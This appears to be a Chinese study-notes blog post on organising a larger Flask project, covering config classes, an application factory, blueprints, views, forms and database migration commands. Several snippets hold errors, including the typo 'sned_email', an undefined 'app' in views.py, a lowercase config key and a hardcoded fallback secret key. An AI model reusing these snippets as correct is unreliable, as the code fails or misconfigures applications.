<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="string">|-flasky</span></span><br><span class="line">  <span class="string">|-app/</span></span><br><span class="line">    <span class="string">|-templates/</span></span><br><span class="line">    <span class="string">|-static/</span></span><br><span class="line">    <span class="string">|-main/</span></span><br><span class="line">      <span class="string">|-__init__.py</span></span><br><span class="line">      <span class="string">|-errors.py</span></span><br><span class="line">      <span class="string">|-forms.py</span></span><br><span class="line">      <span class="string">|-views.py</span></span><br><span class="line">    <span class="string">|-__init__.py</span></span><br><span class="line">    <span class="string">|-email.py</span></span><br><span class="line">    <span class="string">|-models.py</span></span><br><span class="line">  <span class="string">|-migrations/</span></span><br><span class="line">  <span class="string">|-tests/</span></span><br><span class="line">    <span class="string">|-__init__.py</span></span><br><span class="line">    <span class="string">|-test*.py</span></span><br><span class="line">  <span class="string">|-venv/</span></span><br><span class="line">  <span class="string">|-requirements.txt</span></span><br><span class="line">  <span class="string">|-config.py</span></span><br><span class="line">  <span class="string">|-flasky.py</span></span><br></pre></td></tr></table></figure>
<p>这种结构有4个顶级文件夹：</p>
<ul>
<li>Flask 应用一般保存在名为 app 的包中；</li>
<li>数据库迁移脚本在 migrations 文件夹中；</li>
<li>单元测试在 tests 包中编写；</li>
<li>Python虚拟环境在 venv 文件夹中。</li>
</ul>
<p>此外，还多了一些新文件：</p>
<ul>
<li>requirements.txt 列出了所有依赖包，便于在其他计算机中重新生成相同的虚拟环境；</li>
<li>config.py 存储配置；</li>
<li>flasky.py 定义 Flask 应用实例，同时还有一些辅助管理应用的任务。</li>
</ul>
<p>下面我们尝试把之前的 hello.py 应用转换成此种结构。</p>
<p>&lt;br&gt;</p>
<h3 id="二、配置选项"><a href="#二、配置选项" class="headerlink" title="二、配置选项"></a>二、配置选项</h3><p>应用经常需要设定多个配置，如开发、测试和生产环境要使用不同的数据库，这样才不会彼此影响。</p>
<p>除了 hello.py 中类似字典的 app.config 对象之外，还可以使用具有层次结构的配置类。将 hello.py 中的配置项独立在 config.py 中如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">basedir = os.path.abspath(os.path.dirname(__file__))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>:</span></span><br><span class="line">    SECRET_KEY = os.environ.get(<span class="string">'SECRET_KEY'</span>) <span class="keyword">or</span> <span class="string">'I am Lethe'</span></span><br><span class="line">    MAIL_SERVER = os.environ.get(<span class="string">'MAIL_SERVER'</span>, <span class="string">'smtp.qq.com'</span>)</span><br><span class="line">    MAIL_PORT = int(os.environ.get(<span class="string">'MAIL_PORT'</span>, <span class="string">'465'</span>))</span><br><span class="line">    MAIL_USE_TLS = os.environ.get(<span class="string">'MAIL_USE_SSL'</span>, <span class="string">'true'</span>).lower() <span class="keyword">in</span> \</span><br><span class="line">        [<span class="string">'true'</span>, <span class="string">'on'</span>, <span class="string">'1'</span>]</span><br><span class="line">    MAIL_USERNAME = os.environ.get(<span class="string">'MAIL_USERNAME'</span>)</span><br><span class="line">    MAIL_PASSWORD = os.environ.get(<span class="string">'MAIL_PASSWORD'</span>)</span><br><span class="line">    FLASKY_MAIL_SUBJECT_PREFIX = <span class="string">'[Flasky]'</span></span><br><span class="line">    FLASKY_MAIL_SENDER = <span class="string">'Flasky Admin &amp;lt;xxxxxxx@qq.com&gt;'</span></span><br><span class="line">    FLASKY_ADMIN = os.environ.get(<span class="string">'FLASKY_ADMIN'</span>)</span><br><span class="line">    sQLALCHEMY_TRACK_MODIFICATIONS = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init_app</span><span class="params">(app)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开发环境数据库</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DevelopmentConfig</span><span class="params">(Config)</span>:</span></span><br><span class="line">    DEBUG = <span class="literal">True</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = os.environ.get(<span class="string">'DEV_DATABASE_URL'</span>) <span class="keyword">or</span> \</span><br><span class="line">        <span class="string">'sqlite:///'</span> + os.path.join(basedir, <span class="string">'data-dev.sqlite'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试环境数据库</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestingConfig</span><span class="params">(Config)</span>:</span></span><br><span class="line">    TESTING = <span class="literal">True</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = os.environ.get(<span class="string">'TEST_DATABASE_URL'</span>) <span class="keyword">or</span> \</span><br><span class="line">        <span class="string">'sqlite://'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成环境数据库</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProductionConfig</span><span class="params">(Config)</span>:</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = os.environ.get(<span class="string">'DATABASE_URL'</span>) <span class="keyword">or</span> \</span><br><span class="line">        <span class="string">'sqlite:///'</span> + os.path.join(basedir, <span class="string">'data.sqlite'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">config = &#123;</span><br><span class="line">    <span class="string">'development'</span>: DevelopmentConfig,</span><br><span class="line">    <span class="string">'testing'</span>: TestingConfig,</span><br><span class="line">    <span class="string">'production'</span>: ProductionConfig,</span><br><span class="line">    <span class="string">'default'</span>: DevelopmentConfig</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>基本Config包含通用配置，各个子类分别定义专用的配置。如果需要，也可以添加其他配置类。</li>
<li>为了更安全和灵活，多数配置都可以从环境变量中导入。</li>
<li>在 3 个子类中，SQLALCHEMY_DATABASE_URI 变量都被指定了不同的值。这样应用就可以在不同的环境中使用不同的数据库。</li>
<li>开发环境和生产环境都配置了邮件服务器。为了再给应用提供一种定制配置的方式，Config 类及其子类可以定义 init_app() 类方法，其参数为应用实例。现在，基类 Config 中的 init_app() 方法为空。</li>
<li>在这个配置脚本末尾，config 字典中注册了不同的配置环境，而且还注册了一个默认配置（这里注册为开发环境）。</li>
</ul>
<p>&lt;br&gt;</p>
<h3 id="三、应用包"><a href="#三、应用包" class="headerlink" title="三、应用包"></a>三、应用包</h3><p>应用包用来存放应用的所有代码、模板和静态文件，通常称为为 app（应用）。<strong>templates 和 static 目录需要移动到应用包中，数据库模型和电子邮件支持函数也要移到这个包中，分别保存为 app/models.py 和 app/email.py。</strong></p>
<h5 id="3-1-使用应用工厂函数"><a href="#3-1-使用应用工厂函数" class="headerlink" title="3.1 使用应用工厂函数"></a>3.1 使用应用工厂函数</h5><p>单个文件中开发应用是很方便，但却有个很大的缺点：应用在全局作用域中创建，无法动态修改配置。运行脚本时，应用实例已经创建，再修改配置为时已晚。这一点对单元测试尤其重要，因为有时为了提高测试覆盖度，必须在不同的配置下运行应用。</p>
<p>这个问题的解决方法是延迟创建应用实例，把创建过程移到可显式调用的工厂函数中。这种方法不仅可以给脚本留出配置应用的时间，还能够创建多个应用实例，为测试提供便利。</p>
<p>应用的工厂函数在 app 包的构造文件 app/__init__.py 中定义如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">from</span> flask_mail <span class="keyword">import</span> Mail</span><br><span class="line"><span class="keyword">from</span> flask_moment <span class="keyword">import</span> Moment</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> config</span><br><span class="line"></span><br><span class="line">bootstrap = Bootstrap()</span><br><span class="line">mail = Mail()</span><br><span class="line">moment = Moment()</span><br><span class="line">db = SQLAlchemy()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_app</span><span class="params">(config_name)</span>:</span></span><br><span class="line">    app = Flask(__name__)</span><br><span class="line">    app.config.from_object(config[config_name])</span><br><span class="line">    config[config_name].init_app(app)</span><br><span class="line"></span><br><span class="line">    bootstrap.init_app(app)</span><br><span class="line">    mail.init_app(app)</span><br><span class="line">    moment.init_app(app)</span><br><span class="line">    db.init_app(app)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加路由和自定义错误页面</span></span><br><span class="line">    <span class="keyword">from</span> .main <span class="keyword">import</span> main <span class="keyword">as</span> main_blueprint</span><br><span class="line">    app.register_blueprint(main_blueprint)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> app</span><br></pre></td></tr></table></figure>
<ul>
<li>构造文件导入了大多数使用的 Flask 扩展，由于此时尚未初始化应用实例，所以这些扩展的实例化并未传参，也就没有真正初始化。</li>
<li>create_app() 函数是应用的工厂函数，接收一个参数，即应用使用的配置名（前面在config.py中定义的）。配置可以通过 app.config 配置对象提供的 from_object() 方法直接导入应用，参数 config[config_name] 即从 config 字典中选择一个配置类进行配置。</li>
<li>在之前创建的的扩展对象上调用 init_app() 方法可以将 Flask 扩展完成初始化。</li>
</ul>
<h5 id="3-2-在蓝本中实现应用功能"><a href="#3-2-在蓝本中实现应用功能" class="headerlink" title="3.2 在蓝本中实现应用功能"></a>3.2 在蓝本中实现应用功能</h5><p>（1）蓝本（blueprint）和应用类似，也可以定义路由和错误处理程序。但是在蓝本中定义的路由和错误处理程序处于休眠状态，直到蓝本注册到应用上之后，才相当于真正定义在了应用中。</p>
<p>蓝本可以在单个文件中定义，也可使用更结构化的方式在<br>包中的多个模块中创建。我们将在应用包中创建一个子包 main，用于保存应用的第一个蓝本。</p>
<p>此子包的构造文件 app/main/__init__.py 如下，创建主蓝本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint</span><br><span class="line"></span><br><span class="line">main = Blueprint(<span class="string">'main'</span>, __name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views, errors</span><br></pre></td></tr></table></figure>
<ul>
<li>蓝本通过实例化一个 Blueprint 类对象创建。这个构造函数有两个必须指定的参数：蓝本的名称和蓝本所在的包或模块。</li>
<li>应用的路由保存在包里的 app/main/views.py 模块中，而错误处理程序保存在 app/main/errors.py 模块中，导入这两个模块就能把路由和错误处理程序与蓝本关联起来。</li>
<li>这些模块在 app/main/<strong>init</strong>.py 脚本的末尾导入，这是为了避免循环导入依赖，因为在 app/main/views.py 和app/main/errors.py 中还要导入 main 蓝本，所以除非循环引用出现在定义 main 之后，否则会致使导入出错。</li>
</ul>
<p>（2）蓝本在工厂函数 create_app() 中注册到应用上，如下注册主蓝本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># app/__init__.py</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_app</span><span class="params">(config_name)</span>:</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="keyword">from</span> .main <span class="keyword">import</span> main <span class="keyword">as</span> main_blueprint</span><br><span class="line">app.register_blueprint(main_blueprint)</span><br><span class="line"><span class="keyword">return</span> app</span><br></pre></td></tr></table></figure>
<p>（3）主蓝本中的错误处理程序 app/main/errors.py：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> main</span><br><span class="line"></span><br><span class="line"><span class="meta">@main.app_errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pate_not_found</span><span class="params">(e)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'404.html'</span>), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@main.app_errorhandler(500)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">internal_server_error</span><span class="params">(e)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'500.html'</span>), <span class="number">500</span></span><br></pre></td></tr></table></figure>
<ul>
<li>之前我们使用的是 errorhandler 装饰器，但是在蓝本中如果使用他，就只有蓝本中的错误才能触发处理程序。</li>
<li>因此我们需要使用 app_errorhandler 装饰器来注册全局的错误处理程序。</li>
</ul>
<p>（4）主蓝本中定义的应用路由 app/main/views.py：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template, session, redirect, url_for, flash</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> main</span><br><span class="line"><span class="keyword">from</span> .forms <span class="keyword">import</span> NameForm</span><br><span class="line"><span class="keyword">from</span> .. <span class="keyword">import</span> db</span><br><span class="line"><span class="keyword">from</span> ..models <span class="keyword">import</span> User</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@main.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    form = NameForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        user = User.query.filter_by(username=form.name.data).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            user = User(username=form.name.data)</span><br><span class="line">            db.session.add(user)</span><br><span class="line">            db.session.commit()</span><br><span class="line">            session[<span class="string">'known'</span>] = <span class="literal">False</span></span><br><span class="line">            <span class="comment"># 发送电子邮件</span></span><br><span class="line">            <span class="keyword">if</span> app.config[<span class="string">'FLASKY_ADMIN'</span>]:</span><br><span class="line">                sned_email(app.config[<span class="string">'FLASKY_ADMIN'</span>], <span class="string">'New User'</span>,</span><br><span class="line">                           <span class="string">'mail/new_user'</span>, user=user)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">'known'</span>] = <span class="literal">True</span></span><br><span class="line">        session[<span class="string">'name'</span>] = form.name.data</span><br><span class="line">        session[<span class="string">'message'</span>] = user.message</span><br><span class="line">        form.name.data = <span class="string">''</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'main.index'</span>)) <span class="comment"># 在同一蓝本中可简写为 .index</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,</span><br><span class="line">                           form=form, name=session.get(<span class="string">'name'</span>),</span><br><span class="line">                           known=session.get(<span class="string">'known'</span>, <span class="literal">False</span>),</span><br><span class="line">                           message=session.get(<span class="string">'message'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@main.route('/user/&amp;lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'user.html'</span>, name=name)</span><br></pre></td></tr></table></figure>
<ul>
<li>和错误处理程序一样，这里的路由装饰器使用的是 main.route，而不是 app.route。</li>
<li>url_for() 函数使用的是 url_for(‘main.index’) ，而不是 url_for(‘index’)。这是因为 Flask 会为蓝本中的全部端点加上一个命名空间，即为蓝本的名称（Blueprint 构造函数的第一个参数）。</li>
<li>若请求的端在在蓝本内，则也可以缩写为 url_for(‘.index’)</li>
</ul>
<p>（5）还需要将表单类移到蓝本中，保存在 app/main/forms.py 模块中：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameForm</span><span class="params">(FlaskForm)</span>:</span></span><br><span class="line">    name = StringField(<span class="string">'What is your name?'</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">'Submit'</span>)</span><br></pre></td></tr></table></figure>
<p>&lt;br&gt;</p>
<h3 id="四、应用脚本"><a href="#四、应用脚本" class="headerlink" title="四、应用脚本"></a>四、应用脚本</h3><p>应用实例在顶级目录中的 flasky.py 模块里定义：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> create_app, db</span><br><span class="line"><span class="keyword">from</span> app.models <span class="keyword">import</span> User, Role</span><br><span class="line"><span class="keyword">from</span> flask_migrate <span class="keyword">import</span> Migrate</span><br><span class="line"></span><br><span class="line">app = create_app(os.getenv(<span class="string">'FLASK_CONFIG'</span>) <span class="keyword">or</span> <span class="string">'default'</span>)</span><br><span class="line">migrate = Migrate(app, db)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.shell_context_processor</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_shell_context</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> dict(db=db, User=User, Role=Role)</span><br></pre></td></tr></table></figure>
<ul>
<li>此主脚本先创建了一个应用实例，配置名可以从环境变量中读取，也可以使用默认值。</li>
<li>然后初始化数据库迁移扩展 Flask-Migreate 并为 Python shell 注册上下文。</li>
</ul>
<p>现在我们要想运行应用，就需要把环境变量 FLASK_APP 设置为 flasky.py ，再执行 flask run 才可以。此外，还可以将 FLASK_DEBUG设置为1，来开启调试模式。</p>
<p>&lt;br&gt;</p>
<h3 id="五、需求文件"><a href="#五、需求文件" class="headerlink" title="五、需求文件"></a>五、需求文件</h3><p>应用中最好有个 requirements.txt 文件，用于记录所有依赖包及其精确的版本号，以便在另一个环境上重新生成虚拟环境。</p>
<p>在虚拟环境中执行如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip freeze &gt;requirements.txt</span><br></pre></td></tr></table></figure>
<p>在安装或升级包后，最好更新一下这个文件。</p>
<p>然后当你想创建这个虚拟环境的副本时，则可以先创建一个新的虚拟环境，然后根据 requirements.txt 安装需要的包和扩展：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
<p>&lt;br&gt;</p>
<h3 id="六、创建数据库"><a href="#六、创建数据库" class="headerlink" title="六、创建数据库"></a>六、创建数据库</h3><p>首选从环境变量中读取数据库的 URL，同时还提供了一个默认的SQLite 数据库作为备用。3 种配置环境中的环境变量名和 SQLite 数据库文件名都不一样。</p>
<p>不管从哪里获取数据库 URL，都要在新数据库中创建数据表，参见“数据库”章节</p>
<p>如果使用 Flask-Migrate 跟踪迁移，可使用下述命令创建数据表或者升级到最新修订版本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flask db upgrade</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Study Notes</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
</search>
